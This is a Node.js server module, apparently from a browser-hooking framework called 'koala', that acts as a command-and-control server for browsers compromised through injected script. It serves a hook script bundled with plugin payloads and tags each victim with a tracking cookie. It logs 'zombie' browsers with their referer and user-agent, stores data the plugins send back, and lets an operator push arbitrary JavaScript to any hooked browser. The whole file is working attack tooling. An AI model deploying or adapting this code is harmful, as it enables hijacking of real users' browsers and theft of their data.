//var Socketio = require('socket.io');
var fs = require('fs');
var path = require('path');
var pc = require('../proxy').pc;
var plugin = require('../proxy').plugin;
var pc_info = require('../proxy').pc_info;
var project = require('../proxy').project;
var eventproxy = require('eventproxy');
var logger = require('../common/logger');
var moment = require('moment');

exports.online = function(server, admin_io, zombie_io){
    admin_io.on('connection',function(socket){
        socket.on('execJSServer',function(data){
            zombie_io.to(data.pcID).emit('exec',data.jsCode);
        });
        zombie_io.on('callbackExec',function(data){
            //console.log(data);
        })
    });

    zombie_io.on('connection',function(socket){
        var cookie = socket.handshake.headers.cookie;
        var pc_id;
        if(pc_id = cookie.match(/__koalaPC_=(.*?)(;|$)/)){
            var pc_socket_id = pc_id[1];
        }
        else{
            logger.error('no cookie!');
            //TODO 异常处理
        }

        //把主机信息入库. 获取项目信息  来一个socket join 一个room
        pc.getNamesByQuery({},{},function(err,data){
            if(err){
                logger.error(err);
                return;
            }else{
                admin_io.emit('updatePC', data);
            }
        });
        //ua,host,origin,user-agent,referer,cookie,
        socket.on('init',function(data){
            //上线更新 操作 触发admin的js更新操作

            //异步 一部分是传输过来,一部分是socket获取.
            var ep = eventproxy();
            ep.fail('err',function(err){
                logger.error(err);
                return;
            });
            ep.all('project', 'socket_get',function(projectName, socket_data){
                //建立一个room
                var update_time = moment(Date.now()).format("YYYY年MM月DD日  hh:mm:ss");
                var zombie_url = socket_data['zombie_referer'];
                var zombie_ua = socket_data['zombie_ua'];
                pc.addPC(projectName, update_time,zombie_url,zombie_ua,true,pc_socket_id, function(err,pcinfo_data){
                    if(err){
                        ep.emit('err',err);
                    }
                    //触发前端上线操作
                    admin_io.emit('updatePC');

                    //加入room
                    socket.join(pc_socket_id);
                    socket['pc_id'] = pcinfo_data.socket_id;

                    zombie_io.to(pcinfo_data.socket_id).emit('exec','document.cookie="__koalaP_='+pcinfo_data.socket_id+'"');
                });
            });
            //获取项目信息
            project.getNamesByQuery({_id:data.projectID},{},function(err,project_data){
                if(err){
                    ep.emit('err',err);
                }
                if(project_data.length != 0 ){
                    var projectName = project_data[0].name;
                    ep.emit('project',projectName);
                }
            });
            try{
                var zombie_referer = socket.handshake.headers.referer;
                var zombie_ua = socket.handshake.headers['user-agent'];

                var socket_data = {
                    'zombie_referer': zombie_referer,
                    'zombie_ua': zombie_ua
                };
                ep.emit('socket_get', socket_data);
            }catch(e){
                logger.error(e);
                return;
            }
        });
        //处理状态更新
        socket.on('updateZombieStatus',function(data){
            //update  触发前端进行更新.
            admin_io.emit('updatePC');
            socket.join(data.pc_socket_id);
        });
        //disconet
        socket.on('disconnect',function(data){
            //update status
            admin_io.emit('updatePC');
            //pc.updatePC({_id:});
            try{
                var pc_socket_id = socket.handshake.headers.cookie.match(/__koalaPC_=(.*?)(;|$)/)[1];
            }catch(e){
                logger.error('cookie error!');
            }
            pc.updatePC({'socket_id':pc_socket_id},{'status':false},{},function(err,data){
                if(err){
                    logger.error('db error');
                    return;
                }
            });
        });
        //插件返回信息处理
        socket.on('trans_data',function(data){
            //信息入库.
            cookie = socket.handshake.headers.cookie;
            pc_id = cookie.match(/__koalaPC_=(.*?)(;|$)/);
            if(pc_id){
                pc_info.addPC_Info(pc_id[1], data, function(err,pc_info_data){
                    if(err){
                        logger.error('info error!');
                        return;
                    }
                });
            }
        })
    });

};

exports.index = function(req,res,next){
    //发送js文件内容 或者数据库
    //socket.js 发过去
    //var project_id = req.path.substring(1);
    var host = req.header('host');
    var cookie = req.cookies;
    var projectid = req.url.match(/\/(.{24})/)[1];
    var ep = new eventproxy();
    var pc_socket_id = Date.now();

    //当判断到有cookie的时候 新建一个连接 更新数据库
    //当是不同页面的时候
    if(cookie.__koalaPC_){
        pc.updatePC({'socket_id':cookie.__koalaPC_,'zombie_url':req.headers.referer,'zombie_ua':req.headers['user-agent']},{
            'socket_id':pc_socket_id,
            'status': true
        },{},function(err){
            if(err){
                logger.error(err);
                return;
            }
            fs.readFile(path.join(__dirname, '../koala.js'),function(err,data){
                if(err){
                    throw err;
                }
                var initKoala = data.toString();
                var initData = initKoala.replace(/\{~socketiourl~\}/g,host);
                initData = initData.replace(/\{~projectid~\}/g, projectid);
                initData = initData.replace(/\{~socketcookie~\}/g, pc_socket_id);
                ep.emit('succ',initData);
            });
        });
    }else{
        fs.readFile(path.join(__dirname, '../koala.js'),function(err,data){
            if(err){
                throw err;
            }
            var initKoala = data.toString();
            var initData = initKoala.replace(/\{~socketiourl~\}/g,host);
            initData = initData.replace(/\{~projectid~\}/g, projectid);
            ep.emit('succ',initData);
        });
    }
    ep.all('succ',function(data){
        //加入插件数据. projectid -> pluginids -> plugincode
        project.getNamesByQuery({'_id':projectid},{},function(err,project_info){
            if(err){
                next(err);
            }
            if(project_info[0] == undefined){
                logger.error('无此项目');
                return;
            }else{
                var plugins_list = project_info[0].plugin_id;
            }
            plugin.getNamesByQuery({'_id':{$in:plugins_list}},{},function(err,plugin_info){

                plugin_info.forEach(function(plugin_code){
                    //过滤下 plugin_code.code
                    var exp = plugin_code.code.replace(/\{~plugin~\}/g,plugin_code.name);
                    data = data + exp;
                });
                res.append('Set-Cookie', '__koalaPC_='+pc_socket_id+'; Path=/;');
                res.send(data+"});");
            });
        });
    });
    //引入jquery TODO: 引入我的框架
};